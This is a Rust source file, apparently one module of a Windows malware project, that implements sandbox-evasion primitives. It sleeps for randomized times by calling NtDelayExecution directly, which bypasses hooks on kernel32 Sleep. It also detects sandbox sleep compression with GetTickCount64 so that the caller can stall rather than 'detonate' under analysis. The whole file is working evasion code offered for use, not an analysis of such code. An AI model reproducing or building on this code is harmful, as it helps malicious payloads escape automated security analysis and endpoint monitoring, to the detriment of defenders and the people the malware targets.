//! timing.rs — sleep jitter and sandbox sleep-compression detection
//!
//! Two independent evasion primitives:
//!
//! 1. `jitter_sleep(base_ms, jitter_ms)`
//!    Sleeps for a random duration in [base_ms, base_ms + jitter_ms) using
//!    NtDelayExecution (NT layer, avoids easy hooks on kernel32!Sleep).
//!
//! 2. `sleep_compression_check(expected_ms, tolerance_ms)`
//!    Sleeps for `expected_ms` milliseconds and measures elapsed time with
//!    GetTickCount64.  If the measured elapsed time is less than
//!    `expected_ms - tolerance_ms`, we conclude the sandbox is accelerating
//!    time (sleep compression) and return `Err`.  The caller should abort
//!    or stall indefinitely to deny the sandbox a detonation.
//!
//! Default values used in main.rs:
//!   base     = 30_000 ms  (30 s)
//!   jitter   = 60_000 ms  (up to 90 s total)
//!   tolerance = 5_000 ms

use windows_sys::Win32::System::SystemInformation::GetTickCount64;

// We call NtDelayExecution directly.  windows-sys doesn't expose it in the
// selected feature set, so we declare it via an extern block.
#[link(name = "ntdll")]
extern "system" {
    /// NtDelayExecution(Alertable: BOOLEAN, DelayInterval: *const LARGE_INTEGER) -> NTSTATUS
    ///
    /// DelayInterval is a negative 100-nanosecond interval (relative delay).
    fn NtDelayExecution(alertable: u8, delay_interval: *const i64) -> i32;
}

/// Convert milliseconds to a negative 100-ns NT interval.
#[inline(always)]
fn ms_to_nt_interval(ms: u64) -> i64 {
    // 1 ms = 10_000 × 100 ns units; negative = relative delay
    -((ms * 10_000) as i64)
}

/// Cheap non-cryptographic LCG PRNG seeded from the stack address.
/// Good enough for timing jitter — we don't need crypto-quality randomness.
fn lcg_rand(seed: &mut u64) -> u64 {
    *seed = seed.wrapping_mul(6_364_136_223_846_793_005)
                .wrapping_add(1_442_695_040_888_963_407);
    *seed >> 33
}

/// Sleep for a randomly jittered duration.
///
/// Actual sleep = base_ms + (random % jitter_ms) milliseconds.
/// Uses NtDelayExecution so the sleep does not go through kernel32.
pub fn jitter_sleep(base_ms: u64, jitter_ms: u64) {
    // Seed the LCG from GetTickCount64 for per-run entropy
    let mut seed: u64 = unsafe { GetTickCount64() } ^ 0xDEAD_BEEF_CAFE_BABE;
    let extra = if jitter_ms > 0 { lcg_rand(&mut seed) % jitter_ms } else { 0 };
    let total_ms = base_ms.saturating_add(extra);

    let interval = ms_to_nt_interval(total_ms);
    unsafe {
        NtDelayExecution(0 /* non-alertable */, &interval);
    }
}

/// Sleep and check whether the sandbox compressed the sleep interval.
///
/// Returns `Ok(())` if the elapsed time is plausible (no compression
/// detected), or `Err("sleep compression detected")` if the sandbox
/// appears to have accelerated time.
pub fn sleep_compression_check(expected_ms: u64, tolerance_ms: u64) -> Result<(), &'static str> {
    let before: u64 = unsafe { GetTickCount64() };

    let interval = ms_to_nt_interval(expected_ms);
    unsafe {
        NtDelayExecution(0, &interval);
    }

    let after: u64  = unsafe { GetTickCount64() };
    let elapsed: u64 = after.wrapping_sub(before);

    let minimum = expected_ms.saturating_sub(tolerance_ms);
    if elapsed < minimum {
        Err("sleep compression detected — possible sandbox environment")
    } else {
        Ok(())
    }
}
